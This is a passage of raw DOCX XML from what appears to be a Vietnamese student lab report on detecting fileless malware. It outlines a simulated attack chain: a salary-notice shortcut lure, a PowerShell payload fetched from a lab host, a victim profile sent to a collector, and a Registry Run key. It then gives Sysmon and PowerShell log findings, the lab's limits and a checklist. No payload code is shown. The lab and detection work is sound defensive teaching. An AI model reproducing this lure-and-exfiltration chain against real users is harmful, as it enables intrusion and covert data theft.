        <w:t xml:space="preserve"> ghi nhận request </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> chứa JSON profile của victim. Khi collector bị tắt, victim xuất hiện file staging tại </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue\victim-profile-*.json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">; khi collector hoạt động lại, queued profile được gửi về attacker. Trên victim, Sysmon Event ID 1 ghi nhận </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> được sinh ra sau khi người dùng mở shortcut, Sysmon Event ID 3 ghi nhận kết nối từ PowerShell đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> và </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, PowerShell Event ID 4104 ghi nhận nội dung script được xử lý, Registry Run key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> thể hiện persistence mô phỏng, trong khi kiểm tra file system không thấy </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> hoặc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.5. Giới hạn của lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Cần nói rõ:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lab không dùng sample Astaroth thật.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không mô phỏng credential theft.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không mô phỏng C2 thật.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không mô phỏng ADS, ExtExport, DLL injection hoặc process injection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chỉ mô phỏng persistence bằng Registry Run key vô hại, dễ phát hiện và dễ cleanup.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không có obfuscation hoặc AV bypass.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload không hiển thị kết quả cho victim; bằng chứng thành công nằm ở log attacker và log phòng thủ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>ZIP và LNK vẫn tồn tại trên victim; phần fileless nằm ở payload execution.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.6. Kết luận Chương 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có thể viết:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360" w:right="216"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Thông qua lab, có thể thấy việc phát hiện Fileless Malware phụ thuộc nhiều vào khả năng quan sát hành vi và tương quan sự kiện. Dù payload không được lưu thành file trên victim, các dấu vết như </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>explorer.exe -&gt; powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>, kết nối từ PowerShell đến máy attacker, nội dung script trong PowerShell Event ID 4104 và sự vắng mặt của file payload trên disk vẫn giúp người phòng thủ dựng lại chuỗi hành vi. Lab vì vậy minh họa rõ rằng fileless không có nghĩa là không để lại dấu vết, mà đòi hỏi cách phát hiện dựa trên hành vi thay vì chỉ dựa trên file.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Checklist hoàn thành lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã tạo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> vô hại trên attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã tạo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã nén </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> thành </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã host </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> bằng Python static server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã chạy Python collector server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Victim tải được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Victim giải nén và mở được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Victim không thấy popup/success rõ ràng sau khi mở LNK.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Static server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> ghi nhận </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Static server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> ghi nhận </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Collector server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> ghi nhận </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Attacker nhận được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>collections\victim-profile-*.json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Khi mất mạng, victim có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue\victim-profile-*.json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Khi có mạng lại, queued profile được gửi sang attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Victim có Registry Run key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã tìm được Sysmon Event ID 1 cho </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã tìm được Sysmon Event ID 3 cho kết nối đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã tìm được Sysmon Event ID 3 cho kết nối đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> khi collector online.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Đã tìm được PowerShell Event ID 4104.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Đã kiểm tra không có payload file trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Đã chụp screenshot kết quả.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Đã viết phần giới hạn an toàn của lab.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã cleanup Registry Run key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã cleanup </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w: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